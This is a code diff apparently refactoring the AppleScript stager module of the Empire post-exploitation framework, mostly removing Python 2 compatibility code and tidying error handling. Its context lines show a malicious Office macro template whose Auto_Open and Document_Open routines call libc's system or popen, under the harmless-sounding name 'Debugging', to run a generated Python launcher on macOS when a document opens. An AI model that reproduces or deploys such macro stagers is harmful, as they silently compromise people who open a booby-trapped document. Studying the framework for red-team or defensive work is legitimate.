@@ -1,13 +1,10 @@
-from __future__ import print_function
-
 import re
-from builtins import object, range, str
 
 from empire.server.common import helpers
 
 
-class Stager(object):
-    def __init__(self, mainMenu, params=[]):
+class Stager:
+    def __init__(self, mainMenu):
         self.info = {
             "Name": "AppleScript",
             "Authors": [
@@ -84,12 +81,6 @@ class Stager(object):
         #   like listeners/agent handlers/etc.
         self.mainMenu = mainMenu
 
-        for param in params:
-            # parameter format is [Name, Value]
-            option, value = param
-            if option in self.options:
-                self.options[option]["Value"] = value
-
     def generate(self):
         def formStr(varstr, instr):
             holder = []
@@ -113,8 +104,8 @@ class Stager(object):
 
         try:
             version = str(version).lower()
-        except TypeError:
-            raise TypeError('Invalid version provided. Accepts "new" and "old"')
+        except TypeError as e:
+            raise TypeError('Invalid version provided. Accepts "new" and "old"') from e
 
         # generate the python launcher code
         pylauncher = self.mainMenu.stagers.generate_launcher(
@@ -141,17 +132,17 @@ class Stager(object):
         #Else
             Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
         #End If
-        
+
         Sub Auto_Open()
             'MsgBox("Auto_Open()")
             Debugging
         End Sub
-        
+
         Sub Document_Open()
             'MsgBox("Document_Open()")
             Debugging
         End Sub
-        
+
         Public Function Debugging() As Variant
             On Error Resume Next
                     #If Mac Then
@@ -167,17 +158,17 @@ class Stager(object):
             elif version == "new":
                 macro = """
         Private Declare PtrSafe Function system Lib "libc.dylib" Alias "popen" (ByVal command As String, ByVal mode As String) as LongPtr
-        
+
         Sub Auto_Open()
             'MsgBox("Auto_Open()")
             Debugging
         End Sub
-        
+
         Sub Document_Open()
             'MsgBox("Document_Open()")
             Debugging
         End Sub
-        
+
         Public Function Debugging() As Variant
             On Error Resume Next
                     #If Mac Then
